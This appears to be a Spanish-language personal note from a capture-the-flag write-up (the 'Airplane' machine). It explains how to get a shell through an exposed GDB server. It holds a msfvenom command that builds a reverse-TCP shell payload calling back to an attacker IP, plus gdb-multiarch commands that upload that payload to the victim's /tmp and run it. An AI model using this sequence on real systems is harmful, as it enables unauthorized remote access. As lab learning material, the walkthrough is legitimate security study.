**GDB (GNU Debugger)** es una herramienta de software libre diseñada para depurar programas en diferentes lenguajes de programación, incluyendo C, C++, Ada, entre otros. Es una herramienta esencial en el desarrollo de software para encontrar y corregir errores o bugs en programas complejos.


# Ejemplo explotación servicio GDB

Creamos el payload y le asignamos permisos de ejecución
```bash
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.0.251 LPORT=4444 PrependFork=true -f elf -o binary.elf
```
![[Pasted image 20240613120316.png]]

Este comando es lo mismo que gdb pero en mi caso estamos usando un sistema aarch64 entonces no es compatible con gdb pero el funcionamiento es el mismo simplemente añadimos que especficamos la arquitectura, una vez ejecutado todos estos comandos obtendriamos acceso a la maquina vicitma
```
gdb-multiarch binary.elf
set architecture i386:x86-64
target extended-remote 10.10.127.37:6048
remote put binary.elf /tmp/binary.elf
set remote exec-file /tmp/binary.elf
run
```
![[Pasted image 20240613130854.png]]
![[Pasted image 20240613131116.png]]

## 1. gdb-multiarch binary.elf

Este comando inicia el depurador GDB configurado para múltiples arquitecturas, y carga el archivo ejecutable `binary.elf` para su depuración.

- `gdb-multiarch`: Es una versión de GDB que soporta múltiples arquitecturas, útil cuando la arquitectura del archivo que deseas depurar es diferente de la arquitectura de la máquina en la que estás ejecutando GDB.
- `binary.elf`: Es el archivo ejecutable que deseas depurar.

## 2. set architecture i386:x86-64

Este comando configura GDB para que interprete el archivo ejecutable como un binario de la arquitectura `x86-64`.
- `set architecture i386:x86-64`: Cambia la arquitectura actual que GDB usa para interpretar el ejecutable. `i386:x86-64` se refiere a la arquitectura de 64 bits basada en x86.
## 3. target extended-remote 10.10.127.37:6048
Este comando establece una conexión remota extendida a un servidor de depuración en una máquina remota.

- `target extended-remote`: Indica que deseas establecer una conexión remota extendida. Esto permite a GDB controlar el proceso de depuración en la máquina remota.
- `10.10.127.37:6048`: Especifica la dirección IP y el puerto donde está ejecutándose el servidor de depuración (como `gdbserver`) en la máquina remota.

## 4. remote put binary.elf /tmp/binary.elf
Este comando transfiere el archivo `binary.elf` desde la máquina local a la máquina remota.
- `remote put binary.elf /tmp/binary.elf`: Envía el archivo local `binary.elf` a la ruta `/tmp/binary.elf` en la máquina remota.

## 5. set remote exec-file /tmp/binary.elf
Este comando indica a GDB que el archivo ejecutable que se debe ejecutar y depurar en la máquina remota es `/tmp/binary.elf`.
- `set remote exec-file /tmp/binary.elf`: Especifica el archivo ejecutable en la máquina remota que GDB debe usar para la depuración.

## 6. run
Este comando inicia la ejecución del archivo ejecutable en la máquina remota bajo el control de GDB.
- `run`: Ejecuta el programa en el contexto del depurador GDB, permitiendo la inspección y manipulación del proceso mientras se ejecuta.

### Proceso Completo
1. **Inicia GDB multi-arquitectura** y carga el ejecutable.
2. **Configura la arquitectura** del ejecutable a x86-64.
3. **Establece una conexión remota** a un servidor de depuración en otra máquina.
4. **Transfiere el ejecutable** desde la máquina local a la remota.
5. **Indica el archivo ejecutable** a usar en la máquina remota.
6. **Inicia la ejecución** del programa en la máquina remota para su depuración.

[[MAQUINA AIRPLANE (Fuzzing web, explotación LFI con script en python,  acceso cargando paylaod por GDB Server, escalada de privilegios con vulnerabilidad SUID y escalada a root revisando permisos sudo)]]

